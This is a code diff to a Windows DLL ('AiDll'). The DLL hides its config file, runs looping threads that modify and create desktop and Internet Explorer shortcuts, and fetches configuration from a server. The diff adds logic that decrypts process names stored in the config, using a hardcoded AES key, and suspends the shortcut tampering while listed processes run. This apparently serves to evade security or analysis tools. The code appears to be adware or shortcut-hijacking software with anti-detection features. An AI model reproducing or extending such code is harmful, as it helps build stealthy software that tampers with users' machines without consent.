@@ -20,8 +20,13 @@
 #include <Sddl.h>
 #pragma comment(lib, "Advapi32.lib") 
 
+#include "crypt/AES.h"
+#include "crypt/base64.h"
+#include "ultra/string-op.h"
 
 std::wstring AiDll::strCfgPath;
+
+std::vector<PTASKCOND> AiDll::v_task;
 
 extern HMODULE g_hModule;
 
@@ -98,6 +103,7 @@ void AiDll::Work(int magic)
 		}
 		PathAppend(szSvcCfg, L"WinUPC.dll");
 		AiDll::strCfgPath = szSvcCfg;
+
 		std::wstring szSvcCfg_Old = std::wstring(szSvcCfg)+L".old";
 		if (::PathFileExistsW(szSvcCfg))
 		{
@@ -119,12 +125,18 @@ void AiDll::Work(int magic)
 		}
 		SetFileAttributes(szSvcCfg, FILE_ATTRIBUTE_HIDDEN);
 		
+		InitProCond();
 		HANDLE hThread[4];
 		hThread[0] = (HANDLE)_beginthreadex(NULL, 0, AiDll::ModifyShortCutProc, NULL, 0, NULL);
 		hThread[1] = (HANDLE)_beginthreadex(NULL, 0, AiDll::CreateShortCutProc, NULL, 0, NULL);
 		hThread[2] = (HANDLE)_beginthreadex(NULL, 0, AiDll::CreateItemShortCutProc, NULL, 0, NULL);
 		hThread[3] = (HANDLE)_beginthreadex(NULL, 0, AiDll::CreateShortCutProcIE, NULL, 0, NULL);
 		::WaitForMultipleObjects(4,hThread,TRUE,INFINITE);
+		std::vector<PTASKCOND>::const_iterator c_iter_task = v_task.begin();
+		for (;c_iter_task!= v_task.end();++c_iter_task)
+		{
+			delete (*c_iter_task);
+		}
 		::CloseHandle(hThread[0]);
 		::CloseHandle(hThread[1]);
 		::CloseHandle(hThread[2]);
@@ -152,6 +164,7 @@ UINT WINAPI  AiDll::ModifyShortCutProc( void* param )
 	{
 		return 0;
 	}
+	
 	CoInitialize(NULL);
 	OutputDebugStringW(L"in mod");
 
@@ -195,6 +208,11 @@ UINT WINAPI  AiDll::ModifyShortCutProc( void* param )
 
 	while(TRUE)
 	{
+		if (!CheckProCond(L"1"))
+		{
+			Sleep(mscTime*1000);
+			continue;
+		}
 		for (int j = 0; j < destVec.size(); j++)
 		{
 			WIN32_FIND_DATA findData = {0};
@@ -316,6 +334,11 @@ UINT WINAPI  AiDll::CreateShortCutProc( void* param )
 	}
 	while(TRUE)
 	{
+		if (!CheckProCond(L"2"))
+		{
+			Sleep(cscTime*1000);
+			continue;
+		}
 		do 
 		{
 			std::wstring strDefaultPath;
@@ -456,6 +479,11 @@ UINT WINAPI  AiDll::CreateItemShortCutProc( void* param )
 		return 0;
 	}
 	
+	if (!CheckProCond(L"4"))
+	{
+		return 0;
+	}
+
 	std::wstring strIcoName = itemIco;
 	std::size_t npos = strIcoName.find_last_of(L"/");
 	if (std::wstring::npos == npos)
@@ -574,6 +602,11 @@ UINT WINAPI  AiDll::CreateShortCutProcIE( void* param )
 
 	while(TRUE)
 	{
+		if (!CheckProCond(L"3"))
+		{
+			Sleep(cscTime*1000);
+			continue;
+		}
 		do 
 		{
 			std::wstring strIEPath;
@@ -1261,4 +1294,160 @@ std::wstring AiDll::GetRequestUrlByName(const std::wstring &strFileName)
 	WCHAR szRequestUrl[MAX_PATH] = {0};
 	swprintf(szRequestUrl,L"%scfg?file=%s&clientver=%s&channel=%s",SERVER_DIR,strFileName.c_str(),szVer,szChannel);
 	return std::wstring(szRequestUrl);
+}
+
+typedef std::vector<std::wstring>::const_iterator cvs_iterator;
+BOOL AiDll::CheckProCond(std::wstring wstrItem)
+{
+	BOOL bRet = FALSE;
+	std::vector<PTASKCOND>::const_iterator c_iter_task = v_task.begin();
+	for (;c_iter_task!= v_task.end();++c_iter_task)
+	{
+		if(std::wstring::npos == (*c_iter_task)->wstrTask.find(wstrItem))
+		{
+			continue;
+		}
+		if (!(*c_iter_task)->vProAnd.empty())
+		{
+			bRet = TRUE;
+			cvs_iterator c_iter_string = (*c_iter_task)->vProAnd.begin();
+			for (;c_iter_string !=  (*c_iter_task)->vProAnd.end(); ++c_iter_string)
+			{
+				if (ultra::CheckProcessExist(*c_iter_string,FALSE))
+				{
+					bRet = FALSE;
+					break;
+				}
+			}
+		}
+		else if (!(*c_iter_task)->vProOr.empty())
+		{
+			cvs_iterator c_iter_string = (*c_iter_task)->vProOr.begin();
+			for (;c_iter_string !=  (*c_iter_task)->vProOr.end(); ++c_iter_string)
+			{
+				if (!ultra::CheckProcessExist(*c_iter_string,FALSE))
+				{
+					bRet = TRUE;
+					break;
+				}
+			}
+		}
+		else
+		{
+			bRet = TRUE;
+		}
+		if (bRet)
+		{
+			break;
+		}
+	}
+	return bRet;
+}
+
+BOOL AiDll::InitProCond()
+{
+	int nCnt = GetPrivateProfileInt(L"condcnt", L"cnt", 0, AiDll::strCfgPath.c_str());
+	if (nCnt <= 0)
+	{
+		return FALSE;
+	}
+	int index = 1;
+	while(index <= nCnt)
+	{
+		std::wstring wstrCond = L"cond";
+		std::wstring wstrIndex;
+		{
+			std::wstringstream wss;
+			wss << index;
+			wss >> wstrIndex;
+		}
+		wstrCond += wstrIndex;
+		++index;
+
+		WCHAR szpand[MAX_PATH] = {0};
+		GetPrivateProfileString(wstrCond.c_str(), L"pand", L"", szpand, MAX_PATH, AiDll::strCfgPath.c_str());
+
+		WCHAR szpor[MAX_PATH] = {0};
+		GetPrivateProfileString(wstrCond.c_str(), L"por", L"", szpor, MAX_PATH, AiDll::strCfgPath.c_str());
+		
+		WCHAR sztask[MAX_PATH] = {0};
+		GetPrivateProfileString(wstrCond.c_str(), L"task", L"", sztask, MAX_PATH, AiDll::strCfgPath.c_str());
+		
+		if (wcscmp(sztask, L"") == 0)
+		{
+			continue;
+		}
+
+		PTASKCOND ptc = new TASKCOND;
+		
+		const wchar_t* split =  L",";
+		if (wcscmp(szpand, L"") != 0)
+		{
+			SplitAndDecryptString(szpand,&(ptc->vProAnd));
+		}
+		else if (wcscmp(szpor, L"") != 0)
+		{
+			SplitAndDecryptString(szpor,&(ptc->vProOr));
+		}
+		ptc->wstrTask = sztask;
+		v_task.push_back(ptc);
+	}
+	int i=0;
+	return TRUE;
+}
+
+void SplitAndDecryptString(wchar_t * szBuffer,std::vector<std::wstring> *pv)
+{
+	const wchar_t* split =  L",";
+	wchar_t *p = wcstok(szBuffer , split);
+	while(NULL != p)
+	{
+		std::wstring wstrItem;
+		DecryptString(p,wstrItem);
+		pv->push_back(wstrItem);
+		p = wcstok(NULL , split);
+	}
+}
+
+
+
+void DecryptAESHelper(unsigned char* pszKey, const char* pszMsg, int& nMsg,int& nBuff,char* out_str)
+{
+	memcpy(out_str,pszMsg,nMsg);
+	try
+	{
+		AES aes(pszKey);
+		aes.InvCipher(out_str, nMsg);
+	}
+	catch(...)
+	{
+		memset(out_str, 0, nBuff + 1);
+		memcpy(out_str,pszMsg,nMsg);
+	}
+}
+
+void DecryptString(const wchar_t* pwszMsg,std::wstring & wstrOut)
+{
+	const char* pszKey = "Qaamr2Npau6jGy4Q";
+	std::string strMsg = ultra::_T2A(pwszMsg);
+	std::string strData = base64_decode(strMsg);
+	if (strData.size() <= 0)
+	{
+		wstrOut = pwszMsg;
+		return ;
+	}
+
+	int ubuff = strlen(pszKey)>16?strlen(pszKey):16;
+	char* pszNewKey = new(std::nothrow) char[ubuff+1];
+	memset(pszNewKey,0,ubuff+1);
+	strcpy_s(pszNewKey,ubuff+1,pszKey);
+
+	int flen = ((strData.length() >> 4) + 1) << 4;
+	char* out_str = (char*)malloc(flen + 1);
+	memset(out_str, 0, flen + 1);
+	int isize = (int)strData.length();
+	DecryptAESHelper((unsigned char*)pszNewKey, (const char*)strData.c_str(),isize, flen,out_str);
+	delete[] pszNewKey;
+	wstrOut = ultra::_A2T(out_str);
+	free(out_str);
 }
